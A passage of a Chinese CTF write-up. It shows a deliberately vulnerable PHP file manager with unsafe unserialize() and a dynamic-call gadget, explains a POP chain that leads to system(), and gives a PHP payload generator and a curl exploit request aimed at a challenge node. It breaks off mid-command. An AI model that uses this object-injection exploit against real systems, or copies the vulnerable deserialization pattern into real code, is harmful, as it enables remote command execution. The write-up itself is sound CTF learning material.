class="built_in">TypeError</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;无法计算MD5哈希，因为文件参数无效: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;文件未找到&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>];</span><br><span class="line">            <span class="variable">$var</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$method</span>(<span class="variable">$var</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;responseData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionInvoker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$functionName</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$functionArguments</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] : <span class="string">&#x27;home&#x27;</span>;</span><br><span class="line"><span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="variable">$upload_dir</span> = <span class="string">&quot;upload/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$upload_dir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;upload_file&#x27;</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">            <span class="variable">$allowed_extensions</span> = [<span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>];</span><br><span class="line">            <span class="variable">$file_info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="variable">$file_extension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="keyword">isset</span>(<span class="variable">$file_info</span>[<span class="string">&#x27;extension&#x27;</span>]) ? <span class="variable">$file_info</span>[<span class="string">&#x27;extension&#x27;</span>] : <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_extension</span>, <span class="variable">$allowed_extensions</span>)) &#123;</span><br><span class="line">                <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-red-600&#x27;&gt;不允许的文件类型。只允许 txt, png, gif, jpg。&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$unique_filename</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>() . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file_extension</span>;</span><br><span class="line">                <span class="variable">$upload_path</span> = <span class="variable">$upload_dir</span> . <span class="variable">$unique_filename</span>;</span><br><span class="line">                <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_path</span>)) &#123;</span><br><span class="line">                    <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-green-600&#x27;&gt;文件上传成功！&lt;/p&gt;&quot;</span>;</span><br><span class="line">                    <span class="variable">$output</span> .= <span class="string">&quot;&lt;p class=&#x27;text-gray-700&#x27;&gt;文件路径：&lt;code class=&#x27;bg-gray-200 p-1 rounded&#x27;&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$upload_path</span>) . <span class="string">&quot;&lt;/code&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-red-600&#x27;&gt;上传失败！&lt;/p&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-red-600&#x27;&gt;请选择一个文件上传。&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;home&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit_md5&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filename_param</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file_to_check&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;file_to_check&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$filename_param</span>)) &#123;</span><br><span class="line">        <span class="variable">$file_object</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$filename_param</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_object</span> === <span class="literal">false</span> || !(<span class="variable">$file_object</span> <span class="keyword">instanceof</span> FileManager)) &#123;</span><br><span class="line">            <span class="variable">$file_object</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>(<span class="variable">$filename_param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$output</span> = <span class="variable">$file_object</span>-&gt;<span class="title function_ invoke__">getFileHash</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-gray-600&#x27;&gt;请输入文件路径进行MD5校验。&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;文件管理系统&lt;/title&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.tailwindcss.com&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: <span class="string">&#x27;Inter&#x27;</span>, sans-serif;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body <span class="class"><span class="keyword">class</span>=&quot;<span class="title">bg</span>-<span class="title">gray</span>-100 <span class="title">flex</span> <span class="title">items</span>-<span class="title">center</span> <span class="title">justify</span>-<span class="title">center</span> <span class="title">min</span>-<span class="title">h</span>-<span class="title">screen</span> <span class="title">px</span>-4 <span class="title">py</span>-8&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">bg</span>-<span class="title">white</span> <span class="title">p</span>-6 <span class="title">md</span>:<span class="title">p</span>-8 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">shadow</span>-<span class="title">md</span> <span class="title">w</span>-<span class="title">full</span> <span class="title">max</span>-<span class="title">w</span>-4<span class="title">xl</span> <span class="title">mx</span>-<span class="title">auto</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">text</span>-3<span class="title">xl</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-6 <span class="title">text</span>-<span class="title">gray</span>-800 <span class="title">text</span>-<span class="title">center</span>&quot;&gt;文件管理系统&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">flex</span> <span class="title">justify</span>-<span class="title">center</span> <span class="title">mb</span>-6 <span class="title">space</span>-<span class="title">x</span>-4&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">action</span>=<span class="title">home</span>&quot; <span class="title">class</span>=&quot;<span class="title">py</span>-2 <span class="title">px</span>-4 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">action</span> === &#x27;<span class="title">home</span>&#x27; ? &#x27;<span class="title">bg</span>-<span class="title">indigo</span>-600 <span class="title">text</span>-<span class="title">white</span>&#x27; : &#x27;<span class="title">bg</span>-<span class="title">indigo</span>-100 <span class="title">text</span>-<span class="title">indigo</span>-800 <span class="title">hover</span>:<span class="title">bg</span>-<span class="title">indigo</span>-200&#x27;; ?&gt;&quot;&gt;主页&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">action</span>=<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">py</span>-2 <span class="title">px</span>-4 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">action</span> === &#x27;<span class="title">upload_file</span>&#x27; ? &#x27;<span class="title">bg</span>-<span class="title">blue</span>-600 <span class="title">text</span>-<span class="title">white</span>&#x27; : &#x27;<span class="title">bg</span>-<span class="title">blue</span>-100 <span class="title">text</span>-<span class="title">blue</span>-800 <span class="title">hover</span>:<span class="title">bg</span>-<span class="title">blue</span>-200&#x27;; ?&gt;&quot;&gt;上传文件&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">action</span> === &#x27;<span class="title">home</span>&#x27;): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">lg</span> <span class="title">text</span>-<span class="title">gray</span>-700 <span class="title">mb</span>-4&quot;&gt;欢迎使用文件管理系统。&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">sm</span> <span class="title">text</span>-<span class="title">gray</span>-500 <span class="title">mb</span>-6&quot;&gt;</span></span><br><span class="line"><span class="class">                    为了确保文件一致性和完整性，请在下载前校验<span class="title">md5</span>值，完成下载后进行对比。</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">text</span>-2<span class="title">xl</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-4 <span class="title">text</span>-<span class="title">gray</span>-800&quot;&gt;文件列表&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">max</span>-<span class="title">h</span>-60 <span class="title">overflow</span>-<span class="title">y</span>-<span class="title">auto</span> <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-200 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">p</span>-2 <span class="title">bg</span>-<span class="title">gray</span>-50&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                    $<span class="title">files</span> = <span class="title">array_diff</span>(<span class="title">scandir</span>($<span class="title">upload_dir</span>), <span class="title">array</span>(&#x27;.&#x27;, &#x27;..&#x27;));</span></span><br><span class="line"><span class="class">                    <span class="title">if</span> (<span class="title">empty</span>($<span class="title">files</span>)) </span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;text-gray-500&#x27;&gt;暂无文件。&lt;/p&gt;&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;ul class=&#x27;text-left space-y-2&#x27;&gt;&quot;</span>;</span><br><span class="line">                        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">                            <span class="variable">$file_path</span> = <span class="variable">$upload_dir</span> . <span class="variable">$file</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;li class=&#x27;flex items-center justify-between p-2 bg-white rounded-md shadow-sm&#x27;&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;span class=&#x27;text-gray-700 break-all mr-2&#x27;&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file</span>) . <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;flex space-x-2&#x27;&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file_path</span>) . <span class="string">&quot;&#x27; download class=&#x27;bg-blue-500 hover:bg-blue-600 text-white text-xs py-1 px-2 rounded-lg transition duration-300 ease-in-out&#x27;&gt;下载&lt;/a&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&#x27;?action=home&#x27; method=&#x27;POST&#x27; class=&#x27;inline-block&#x27;&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;file_to_check&#x27; value=&#x27;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file_path</span>) . <span class="string">&quot;&#x27;&gt;&quot;</span>; </span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;button type=&#x27;submit&#x27; name=&#x27;submit_md5&#x27; class=&#x27;bg-purple-500 hover:bg-purple-600 text-white text-xs py-1 px-2 rounded-lg transition duration-300 ease-in-out&#x27;&gt;校验MD5&lt;/button&gt;&quot;</span>; </span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;/form&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;/li&gt;&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;/ul&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$output</span>)): <span class="meta">?&gt;</span></span><br><span class="line">                    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">mt</span>-6 <span class="title">p</span>-4 <span class="title">bg</span>-<span class="title">gray</span>-50 <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-200 <span class="title">rounded</span>-<span class="title">lg</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> <span class="title">mb</span>-2 <span class="title">text</span>-<span class="title">gray</span>-800&quot;&gt;校验结果:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">output</span>; ?&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">elseif</span> ($<span class="title">action</span> === &#x27;<span class="title">upload_file</span>&#x27;): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">text</span>-2<span class="title">xl</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-4 <span class="title">text</span>-<span class="title">gray</span>-800 <span class="title">text</span>-<span class="title">center</span>&quot;&gt;上传文件&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">form</span> <span class="title">action</span>=&quot;?<span class="title">action</span>=<span class="title">upload_file</span>&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">class</span>=&quot;<span class="title">space</span>-<span class="title">y</span>-4&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">block</span> <span class="title">text</span>-<span class="title">gray</span>-700 <span class="title">text</span>-<span class="title">sm</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-2&quot;&gt;选择文件:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">id</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">block</span> <span class="title">w</span>-<span class="title">full</span> <span class="title">text</span>-<span class="title">sm</span> <span class="title">text</span>-<span class="title">gray</span>-900 <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-300 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">cursor</span>-<span class="title">pointer</span> <span class="title">bg</span>-<span class="title">gray</span>-50 <span class="title">focus</span>:<span class="title">outline</span>-<span class="title">none</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">w</span>-<span class="title">full</span> <span class="title">bg</span>-<span class="title">blue</span>-500 <span class="title">hover</span>:<span class="title">bg</span>-<span class="title">blue</span>-600 <span class="title">text</span>-<span class="title">white</span> <span class="title">font</span>-<span class="title">semibold</span> <span class="title">py</span>-2 <span class="title">px</span>-4 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">transition</span> <span class="title">duration</span>-300 <span class="title">ease</span>-<span class="title">in</span>-<span class="title">out</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    上传</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">if</span> (!<span class="title">empty</span>($<span class="title">output</span>)): ?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mt</span>-6 <span class="title">p</span>-4 <span class="title">bg</span>-<span class="title">gray</span>-50 <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-200 <span class="title">rounded</span>-<span class="title">lg</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> <span class="title">mb</span>-2 <span class="title">text</span>-<span class="title">gray</span>-800&quot;&gt;上传结果:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">output</span>; ?&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">mt</span>-6 <span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">sm</span> <span class="title">text</span>-<span class="title">gray</span>-500&quot;&gt;</span></span><br><span class="line"><span class="class">                只允许上传 .<span class="title">txt</span>, .<span class="title">png</span>, .<span class="title">gif</span>, .<span class="title">jpg</span> 文件。</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>两个功能：上传和<strong>文件MD5校验</strong><br />漏洞出现在<code>$file_object = @unserialize($filename_param);</code><br /><strong>POP链构造</strong>：</p><ul><li>链尾</li></ul><p>类<code>ContentProcessor</code>出现了<code>($_POST['cmd'])</code>我们不难猜测，前面的<code>$this-&gt;callbackFunction</code>可以构造<code>system</code>函数</p><p><code>$this-&gt;$key</code>就是类<code>FunctionInvoker</code>了，它只有<code>__call</code>方法，前面构造的<code>system</code>函数就能触发</p><ul><li>链首</li></ul><p>那么谁来触发<code>__get</code>呢？<br />我们知道反序列化的入口是<code>FileManager-&gt;getFileHash()</code>，<code>$md5_hash = md5_file($this-&gt;targetFile)</code> <code>else if (is_object($this-&gt;targetFile))</code>正好我们传入对象时，PHP的<code>md5_file</code>会把对象自动转化为字符串，从而触发<code>__toString</code></p><ul><li>中间</li></ul><p>注意到<code>$this-&gt;$method($var)</code>，观察<code>var</code>的位置，<code>performWriteOperation</code>可以作为<code>method</code>，<code>$targetObject = $this-&gt;targetFile; $value = $targetObject-&gt;$var;</code> <code>$var</code>可以指向<code>private $processedContent;</code>来触发链尾的<code>__get</code>。</p><p><code>FileManager::__toString() -&gt; FileManager::performWriteOperation() -&gt; ContentProcessor::__get()</code></p><p>这里出现了两次<code>$this-&gt;targetFile;</code>，第一次是用来触发<code>__toString</code>的，第二次才是触发<code>__get</code>的<br />PS：<code>$this</code>指的是当前，是实时变化的</p><p>确保<code>submit_md5</code>不为空，进入正确的判断分支，<code>file_to_check</code>为我们反序列化的<code>payload</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要定义题目中所有的类，以确保序列化正常</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationContext</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionInvoker</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ContentProcessor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$processedContent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callbackFunction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;processedContent = <span class="keyword">new</span> <span class="title class_">FunctionInvoker</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$targetFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$responseData</span> = <span class="string">&#x27;default_response&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---- 开始构建POP链 ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 链条末端：创建ContentProcessor对象，设置回调函数为system</span></span><br><span class="line"><span class="variable">$cp</span> = <span class="keyword">new</span> <span class="title class_">ContentProcessor</span>();</span><br><span class="line"><span class="variable">$cp</span>-&gt;callbackFunction = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 中间环节：创建内部FileManager对象，其targetFile指向$cp</span></span><br><span class="line"><span class="variable">$fm2</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>();</span><br><span class="line"><span class="variable">$fm2</span>-&gt;targetFile = <span class="variable">$cp</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 链条起点：创建外部FileManager对象，其targetFile指向$fm2</span></span><br><span class="line"><span class="variable">$fm1</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>();</span><br><span class="line"><span class="variable">$fm1</span>-&gt;targetFile = <span class="variable">$fm2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 序列化最终的对象</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$fm1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL编码后的Payload:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;http://node8.anna.nssctf.cn:23190/?action=home&#x27;</span> -d <span class="string">&quot;submit_md5=1&amp;method=performWriteOperation&amp;var=processedContent&amp;cmd=cat 